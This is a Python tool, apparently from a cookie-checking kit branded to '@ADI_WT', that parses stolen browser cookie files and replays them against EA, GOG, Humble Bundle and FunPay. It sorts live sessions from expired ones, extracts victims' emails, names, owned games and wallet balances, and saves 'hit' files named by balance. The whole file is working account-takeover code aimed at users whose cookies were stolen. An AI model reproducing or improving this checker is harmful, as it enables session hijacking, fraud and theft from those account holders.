
"""
Subscription Checkers - EA, GOG, Humble Bundle, FunPay
Based on Subscription_APIs_Only_Working.txt
"""
import re
import json
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── EA ──────────────────────────────────────────────────────────────────────

def is_valid_ea(d: dict) -> bool:
    return any(k in d for k in ['ealocale', 'remid', 'xsrf', 'auth', 'ea_token'])

def count_valid_ea(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_ea(d):
            result.append((src, d))
    return len(result), result

def check_ea_cookie(cookies_dict, proxies_list):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()]),
            'Accept': 'application/json',
        }
        r = requests.get('https://www.ea.com/user-data', headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            try:
                data = r.json()
                if data.get('authenticated') == True:
                    return {
                        'email': data.get('email', 'N/A'),
                        'name': data.get('displayName', 'N/A'),
                        'is_premium': data.get('hasEAPlay', False),
                        'plan': 'EA Play' if data.get('hasEAPlay') else 'Free',
                        'country': data.get('country', 'N/A'),
                    }, 'valid'
                else:
                    return None, 'expired'
            except:
                return None, 'error'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── GOG ─────────────────────────────────────────────────────────────────────

def is_valid_gog(d: dict) -> bool:
    return any(k in d for k in ['gog_lc', 'gog_ui', 'gog_al', 'gog_us'])

def count_valid_gog(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_gog(d):
            result.append((src, d))
    return len(result), result

def check_gog_cookie(cookies_dict, proxies_list):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()]),
            'Accept': 'application/json',
        }
        r = requests.get('https://www.gog.com/userData.json', headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            try:
                data = r.json()
                if not data.get('isLoggedIn'):
                    return None, 'expired'   # JSON aaya par logged out hai
                return {
                    'email': data.get('email', 'N/A'),
                    'name': data.get('username', 'N/A'),
                    'is_premium': True,
                    'plan': 'GOG Galaxy',
                    'games_owned': len(data.get('ownedGames', [])),
                    'country': data.get('country', 'N/A'),
                }, 'valid'
            except:
                return None, 'error'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Humble Bundle ───────────────────────────────────────────────────────────

def is_valid_humble(d: dict) -> bool:
    return any(k in d for k in ['csrf_cookie', 'hbuid', '_simpleauth_sess'])

def count_valid_humble(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_humble(d):
            result.append((src, d))
    return len(result), result

def check_humble_cookie(cookies_dict, proxies_list):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()]),
        }
        r = requests.get('https://www.humblebundle.com/user/wallet', headers=headers, timeout=(5, 10), verify=False, allow_redirects=False)

        if r.status_code in (301, 302, 303):
            return None, 'expired'   # /login pe redirect = session dead
        if r.status_code == 200:
            # Parse wallet balance from HTML
            balance_match = re.search(r'wallet["\']?\s*[:=]\s*["\']?([\d.]+)', r.text)
            balance = balance_match.group(1) if balance_match else '0'

            return {
                'is_premium': True,
                'plan': 'Humble Bundle',
                'wallet': balance,
            }, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── FunPay ──────────────────────────────────────────────────────────────────

def is_valid_funpay(d: dict) -> bool:
    return any(k in d for k in ['golden_token', 'phpsessid', 'user_id'])

def count_valid_funpay(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_funpay(d):
            result.append((src, d))
    return len(result), result

def check_funpay_cookie(cookies_dict, proxies_list):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()]),
        }
        r = requests.get('https://funpay.com/en/', headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            # data-app-data JSON mein userId — 0 matlab guest (logged out)
            app_match = re.search(r'data-app-data="([^"]+)"', r.text)
            if not app_match:
                return None, 'expired'
            app_data = app_match.group(1).replace('&quot;', '"')
            uid_match = re.search(r'"userId":\s*(\d+)', app_data)
            if not uid_match or uid_match.group(1) == '0':
                return None, 'expired'

            balance_match = re.search(r'balance["\']?\s*[:=]\s*["\']?([\d.]+)', r.text)
            balance = balance_match.group(1) if balance_match else '0'

            return {
                'id': uid_match.group(1),
                'is_premium': True,
                'plan': 'FunPay',
                'balance': balance,
            }, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Helper ──────────────────────────────────────────────────────────────────

def _parse_cookies(text: str) -> Dict[str, str]:
    text = text.strip()
    if not text:
        return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
        elif '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                cookies[kv[0].strip().strip('"')] = kv[1].strip().strip(';').strip('"')
    return cookies


# ─── Formatters ──────────────────────────────────────────────────────────────

def format_hit_ea(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE EA Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Email      : {result.get('email', 'N/A')}
  Name       : {result.get('name', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}
  Country    : {result.get('country', 'N/A')}

════════════════════════════════════════════════════════
"""
    return content, f"[ea_{result.get('name', 'unknown')}].txt"


def format_hit_gog(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE GOG Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Email      : {result.get('email', 'N/A')}
  Name       : {result.get('name', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Games      : {result.get('games_owned', 0)}
  Country    : {result.get('country', 'N/A')}

════════════════════════════════════════════════════════
"""
    return content, f"[gog_{result.get('name', 'unknown')}].txt"


def format_hit_humble(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Humble Bundle Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Plan       : {result.get('plan', 'N/A')}
  Wallet     : ${result.get('wallet', '0')}

════════════════════════════════════════════════════════
"""
    return content, f"[humble_{result.get('wallet', '0')}].txt"


def format_hit_funpay(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE FunPay Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Plan       : {result.get('plan', 'N/A')}
  Balance    : ${result.get('balance', '0')}

════════════════════════════════════════════════════════
"""
    return content, f"[funpay_{result.get('balance', '0')}].txt"
